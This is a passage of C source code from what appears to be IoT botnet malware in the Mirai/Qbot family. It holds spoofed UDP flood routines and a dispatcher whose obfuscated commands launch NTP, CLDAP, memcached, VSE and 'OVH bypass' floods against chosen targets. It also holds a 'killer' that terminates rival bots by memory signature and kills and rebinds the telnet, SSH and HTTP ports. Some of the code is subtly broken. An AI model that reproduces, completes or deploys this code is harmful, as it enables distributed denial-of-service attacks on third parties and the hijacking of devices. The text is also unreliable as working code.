    vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79", &vse_payload_len;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    register unsigned int pollRegister;
    pollRegister = pollinterval;
    if(spoofit == 32){
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
        if(buf == NULL) return;
        memset(buf, 0, packetsize + 1);
        makeRandomStr(buf, packetsize);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            if(i == pollRegister){
                if(port == 0) dest_addr.sin_port = rand_cmwc();
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
    else{
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0){
            return;
        }
        int counter = 50;
        while(counter--){
            srand(time(NULL) ^ rand_cmwc());
            
        }
        in_addr_t netmask;
        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
        makevsepacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
        udph->len = htons(sizeof(struct udphdr) + packetsize + vse_payload_len);
        udph->source = rand_cmwc();
        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
        udph->check = 0;
        udph->check = checksum_tcp_udp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
        makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            udph->source = rand_cmwc();
            udph->dest = (port == 0 ? rand_cmwc() : htons(port));
            iph->id = rand_cmwc();
            iph->saddr = htonl( findRandIP(netmask) );
            iph->check = csum ((unsigned short *) packet, iph->tot_len);
            if(i == pollRegister){
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
}
void makeechopacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize){
    char *echo_payload;
    int echo_payload_len;
    echo_payload = "\x0D\x0A\x0D\x0A", &echo_payload_len;
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize + echo_payload_len;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
void echoattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime){
    char *echo_payload;
    int echo_payload_len;
    echo_payload = "\x0D\x0A\x0D\x0A", &echo_payload_len;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    register unsigned int pollRegister;
    pollRegister = pollinterval;
    if(spoofit == 32){
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
        if(buf == NULL) return;
        memset(buf, 0, packetsize + 1);
        makeRandomStr(buf, packetsize);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            if(i == pollRegister){
                if(port == 0) dest_addr.sin_port = rand_cmwc();
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
    else{
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0){
            return;
        }
        int counter = 50;
        while(counter--){
            srand(time(NULL) ^ rand_cmwc());
            
        }
        in_addr_t netmask;
        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
        makeechopacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
        udph->len = htons(sizeof(struct udphdr) + packetsize + echo_payload_len);
        udph->source = rand_cmwc();
        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
        udph->check = 0;
        udph->check = checksum_tcp_udp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + echo_payload_len);
        makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + echo_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            udph->source = rand_cmwc();
            udph->dest = (port == 0 ? rand_cmwc() : htons(port));
            iph->id = rand_cmwc();
            iph->saddr = htonl( findRandIP(netmask) );
            iph->check = csum ((unsigned short *) packet, iph->tot_len);
            if(i == pollRegister){
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
}
int socket_connect(char *host, in_port_t port) {
    struct hostent *hp;
    struct sockaddr_in addr;
    int on = 1, sock;     
    if ((hp = gethostbyname(host)) == NULL) return 0;
    bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;
    sock = socket(PF_INET, SOCK_STREAM, 0);
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
    if (sock == -1) return 0;
    if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
    return sock;
}


char *getArch() {
    #if defined(__x86_64__) || defined(_M_X64)
    return "x86_64";
    #elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
    return "x86_32";
    #elif defined(__ARM_ARCH_2__) || defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__) || defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "Arm4";
    #elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return "Arm5"
    #elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_) ||defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__) || defined(__aarch64__)
    return "Arm6";
    #elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "Arm7";
    #elif defined(mips) || defined(__mips__) || defined(__mips)
    return "Mips";
    #elif defined(mipsel) || defined (__mipsel__) || defined (__mipsel) || defined (_mipsel)
    return "Mipsel";
    #elif defined(__sh__)
    return "Sh4";
    #elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(__PPC__) || defined(__PPC64__) || defined(_ARCH_PPC) || defined(_ARCH_PPC64)
    return "Ppc";
    #elif defined(__sparc__) || defined(__sparc)
    return "spc";
    #elif defined(__m68k__)
    return "M68k";
    #elif defined(__arc__)
    return "Arc";
    #else
    return "Unknown Architecture";
    #endif
}

char *getPortz()
{
        if(access("/usr/bin/python", F_OK) != -1){
        return "22";
        }
        if(access("/usr/bin/python3", F_OK) != -1){
        return "22";
        }
        if(access("/usr/bin/perl", F_OK) != -1){
        return "22";
        }
        if(access("/usr/sbin/telnetd", F_OK) != -1){
        return "22";
        } else {
        return "Unknown Port";
        }
}

void processCmd(int argc, unsigned char *argv[]){
        if(!strcmp(argv[0], decode("1-|"))) { //Tard UDP . UDP ip port time
           if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1)
           { return;}
           unsigned char *ip = argv[1];
           int port = atoi(argv[2]);
           int time = atoi(argv[3]);
           int spoofed = 32;
           int packetsize = 10000;
           int pollinterval = 10;
           int sleepcheck = 1000000;
           int sleeptime = 0;
           if(strstr(ip, ",") != NULL){
               unsigned char *hi = strtok(ip, ",");
               while(hi != NULL) {
                   if(!listFork()) {
                       k2o_BB2(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                       _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } 
            else {
                if (!listFork()){
                    k2o_BB2(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                    _exit(0);
                }
            }
            return;
        }
        if(!strcmp(argv[0], decode("6c-"))){ //. STD ip port time
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000){
            return;
                }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                if(strstr(ip, ",") != NULL){
                    unsigned char *hi = strtok(ip, ",");
                    while(hi != NULL){
                        if(!listFork()){
                          sendSTD(hi, port, time);
                          _exit(0);
                        }
                    hi = strtok(NULL, ",");
                    }
             } else {
                 if (listFork()) { return; }
                 sendSTD(ip, port, time);
                 _exit(0);
             }
        }
        if(!strcmp(argv[0], decode("@<j"))){ //. STD ip port time
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000){
            return;
                }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                if(strstr(ip, ",") != NULL){
                    unsigned char *hi = strtok(ip, ",");
                    while(hi != NULL){
                        if(!listFork()){
                          sendZgo(hi, port, time);
                          _exit(0);
                        }
                    hi = strtok(NULL, ",");
                    }
             } else {
                 if (listFork()) { return; }
                 sendZgo(ip, port, time);
                 _exit(0);
             }
        }
        if(!strcmp(argv[0], decode("@-|"))){ //. STD ip port time
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000){
            return;
                }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                if(strstr(ip, ",") != NULL){
                    unsigned char *hi = strtok(ip, ",");
                    while(hi != NULL){
                        if(!listFork()){
                          sendZDP(hi, port, time);
                          _exit(0);
                        }
                    hi = strtok(NULL, ",");
                    }
             } else {
                 if (listFork()) { return; }
                 sendZDP(ip, port, time);
                 _exit(0);
             }
        }
        if(!strcmp(argv[0], decode(",dj"))){ //. STD ip port time
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000){
            return;
                }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                if(strstr(ip, ",") != NULL){
                    unsigned char *hi = strtok(ip, ",");
                    while(hi != NULL){
                        if(!listFork()){
                          sendZgo(hi, port, time);
                          _exit(0);
                        }
                    hi = strtok(NULL, ",");
                    }
             } else {
                 if (listFork()) { return; }
                 sendOvhBypassOne(ip, port, time);
                 _exit(0);
             }
        }
        if(!strcmp(argv[0], "OVH")){ //. STD ip port time
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000){
            return;
                }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                if(strstr(ip, ",") != NULL){
                    unsigned char *hi = strtok(ip, ",");
                    while(hi != NULL){
                        if(!listFork()){
                          sendOvhBypassTwo(hi, port, time);
                          _exit(0);
                        }
                    hi = strtok(NULL, ",");
                    }
             } else {
                 if (listFork()) { return; }
                 sendOvhBypassTwo(ip, port, time);
                 _exit(0);
             }
        }
        if(!strcmp(argv[0], decode("jge"))){ //. STD ip port time
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000){
            return;
                }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                if(strstr(ip, ",") != NULL){
                    unsigned char *hi = strtok(ip, ",");
                    while(hi != NULL){
                        if(!listFork()){
                          sendOvhBypassThree(hi, port, time);
                          _exit(0);
                        }
                    hi = strtok(NULL, ",");
                    }
             } else {
                 if (listFork()) { return; }
                 sendOvhBypassThree(ip, port, time);
                 _exit(0);
             }
        }
        if(!strcmp(argv[0], decode("g6m"))) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        vseattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                vseattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
                _exit(0);
            }
        }
        if(!strcmp(argv[0], decode("vx|"))) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        ripattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                ripattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
                _exit(0);
            }
        }
        if(!strcmp(argv[0], decode("mDej"))) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        echoattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                echoattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
                _exit(0);
            }
        }
        if(!strcmp(argv[0], decode("+c-"))) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        xtdattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                xtdattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
                _exit(0);
            }
        }
        if(!strcmp(argv[0], decode("~-7|"))) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        cldapattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                cldapattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
                _exit(0);
            }
        }
        if(!strcmp(argv[0], decode("6-|"))) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        ntpattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                ntpattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
                _exit(0);
            }
        }
        if(!strcmp(argv[0], decode("hmh"))) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        memattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                memattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
                _exit(0);
            }
        }
        
        if(!strcmp(argv[0], decode("<7hm"))) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        memattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        vseattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        cldapattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        ntpattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        xtdattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                        memattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        vseattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        ntpattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        xtdattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        cldapattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                    }
                _exit(0);
            }
        }
        if(!strcmp(argv[0], decode("6cj|")))
        {
                int killed = 0;
                unsigned long i;
                for (i = 0; i < numpids; i++)
                {
                        if (pids[i] != 0 && pids[i] != getpid())
                        {
                                kill(pids[i], 9);
                                killed++;
                        }
                }
                if(killed > 0)
                {
                    //
                } else {
                            //
                       }
        }
}

void hex2bin(const char* in, size_t len, unsigned char* out) {

  static const unsigned char TBL[] = {
     0,   1,   2,   3,   4,   5,   6,   7,   8,   9,  58,  59,
    60,  61,  62,  63,  64,  10,  11,  12,  13,  14,  15
  };

  static const unsigned char *LOOKUP = TBL - 48;

  const char* end = in + len;

  while(in < end) *(out++) = LOOKUP[*(in++)] << 4 | LOOKUP[*(in++)];

}
char *knownBots[] = { // known bots for memory based botkillr
    "584D4E4E43504622", //upx botkill
    "2F6465762F6D6973632F7761746368646F67", //mirai botkill (backdoor botkill???)
    "DEADBEEF", //mirai botkill 1
    "4E4B5156474C4B4C450256574C1222", //mirai botkill 2
    "4C4F4C4E4F4754464F", //qbot botkill 1
    "212A20445550", //qbot botkill 2
    "5453554E414D49", //ziggy botkill
    "50414E20", //ziggy botkill
    "7A6F6C6C617264", //zollard
    "5245504F52542025733A", //generic report botkill
    "64767268656C706572",
    "647672737570706F7274",
    "6D69726169",
    "626C616465",
    "64656D6F6E",
    "686F686F",
    "68616B6169",
    "7361746F7269",
    "6D657373696168",
    "6D697073",
    "6D697073656C",
    "737570657268",
    "61726D7637",
    "61726D7636",
    "69363836",
    "706F7765727063",
    "69353836",
    "6D36386B",
    "7370617263",
    "61726D7634",
    "61726D7635",
    "6B6F736861",
    "796F796F",
    "3434306670",
    "6D696F7269",
    "6E6967676572",
    "6B6F77616973746F726D",
    "6C6F6C6E6F6774666F",
    "636F726F6E61",
    "64757073",
    "6D6173757461",
    "626F746E6574",
    "637261636B6564",
    "736C756D70",
    "737464666C6F6F64",
    "756470666C6F6F64",
    "746370666C6F6F64",
    "68747470666C6F6F64",
    "6368696E6573652066616D696C79",
    "76737061726B7A7979",
    "736861646F68",
    "6F7369726973",
    "6B6F776169",
        "998F989C8F98D0CA8986859F8E8C868B988FC7848D838492EA", //ares generic mirai botkill
    "557365722D4167656E743A202573", //User-Agent: %s BOTKILL LOL
    "4F4D564A4750", // mirai encoded "mother"
    "445741494750", // mirai encoded "fucker"
    "4572726F7220647572696E67206E6F6E2D626C6F636B696E67206F7065726174696F6E3A" // old botkill for all bots version
};

int mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;

    if (str_len > buf_len)
        return 0;

    while (buf_len--)
    {
        if (*buf++ == str[matches])
        {
            if (++matches == str_len)
                return 1;
        }
        else
            matches = 0;
    }

    return 0;
}
int killer_pid;
char *killer_realpath;
int killer_realpath_len = 0;

int has_exe_access(void)
{
    char path[PATH_MAX], *ptr_path = path, tmp[16];
    int fd, k_rp_len;

    // Copy /proc/$pid/exe into path
    ptr_path += util_strcpy(ptr_path, "/proc/");
    ptr_path += util_strcpy(ptr_path, util_itoa(getpid(), 10, tmp));
    ptr_path += util_strcpy(ptr_path, "/exe");

    // Try to open file
    if ((fd = open(path, O_RDONLY)) == -1)
    {
        return 0;
    }
    close(fd);

    if ((k_rp_len = readlink(path, killer_realpath, PATH_MAX - 1)) != -1)
    {
        killer_realpath[k_rp_len] = 0;
    }

    util_zero(path, ptr_path - path);

    return 1;
}
int memory_j83j_match(char *path)
{
    int fd, ret;
    char rdbuf[4096];
    int found = 0;
    int i;
    if ((fd = open(path, O_RDONLY)) == -1) return 0;
    unsigned char searchFor[64];
    util_zero(searchFor, sizeof(searchFor));
    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)
    {
        for (i = 0; i < NUMITEMS(knownBots); i++) {
            hex2bin(knownBots[i], util_strlen(knownBots[i]), searchFor);
            if (mem_exists(rdbuf, ret, searchFor, util_strlen(searchFor))){
                found = 1;
                break;
            }
            util_zero(searchFor, sizeof(searchFor));
        }
        
    }

    close(fd);

    return found;
}
#define KILLER_MIN_PID              1000
#define KILLER_RESTART_SCAN_TIME    1
void killer_xywz(int parentpid)
{
    int killer_highest_pid = KILLER_MIN_PID, last_pid_j83j = time(NULL), tmp_bind_fd;
    uint32_t j83j_counter = 0;
    struct sockaddr_in tmp_bind_addr;

    // Let parent continue on main thread
    killer_pid = fork();
    if (killer_pid > 0 || killer_pid == -1)
        return;

    tmp_bind_addr.sin_family = AF_INET;
    tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;

    // Kill telnet service and prevent it from restarting
#ifdef KILLER_REBIND_TELNET
    killer_kill_by_port(HTONS(23));
    
    tmp_bind_addr.sin_port = HTONS(23);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#endif

    // Kill SSH service and prevent it from restarting
#ifdef KILLER_REBIND_SSH
    killer_kill_by_port(HTONS(22));
    
    tmp_bind_addr.sin_port = HTONS(22);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#endif

    // Kill HTTP service and prevent it from restarting
#ifdef KILLER_REBIND_HTTP
    killer_kill_by_port(HTONS(80));
    tmp_bind_addr.sin_port = HTONS(80);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#endif

    // In case the binary is getting deleted, we want to get the REAL realpath
  //  sleep(5);

    killer_realpath = malloc(PATH_MAX);
    killer_realpath[0] = 0;
    killer_realpath_len = 0;

    if (!has_exe_access())
    {
        return;
    }

    while (1)
    {
        DIR *dir;
        struct dirent *file;
        if ((dir = opendir("/proc/")) == NULL)
        {
            break;
        }
        while ((file = readdir(dir)) != NULL)
        {
            // skip all folders that are not PIDs
            if (*(file->d_name) < '0' || *(file->d_name) > '9')
                continue;

            char exe_path[64], *ptr_exe_path = exe_path, realpath[PATH_MAX];
            char status_path[64], *ptr_status_path = status_path;
            int rp_len, fd, pid = atoi(file->d_name);
            j83j_counter++;
            if (pid <= killer_highest_pid && pid != parentpid || pid != getpid()) //skip our parent and our own pid
            {
                if (time(NULL) - last_pid_j83j > KILLER_RESTART_SCAN_TIME) // If more than KILLER_RESTART_SCAN_TIME has passed, restart j83js from lowest PID for process wrap
                {
                    killer_highest_pid = KILLER_MIN_PID;
                }
                else
                {
                    if (pid > KILLER_MIN_PID && j83j_counter % 10 == 0)
                        sleep(1); // Sleep so we can wait for another process to spawn
                }

                continue;
            }
            if (pid > killer_highest_pid)
                killer_highest_pid = pid;
            last_pid_j83j = time(NULL);

            // Store /proc/$pid/exe into exe_path
            ptr_exe_path += util_strcpy(ptr_exe_path, "/proc/");
            ptr_exe_path += util_strcpy(ptr_exe_path, file->d_name);
            ptr_exe_path += util_strcpy(ptr_exe_path, "/exe");

            // Store /proc/$pid/status into status_path
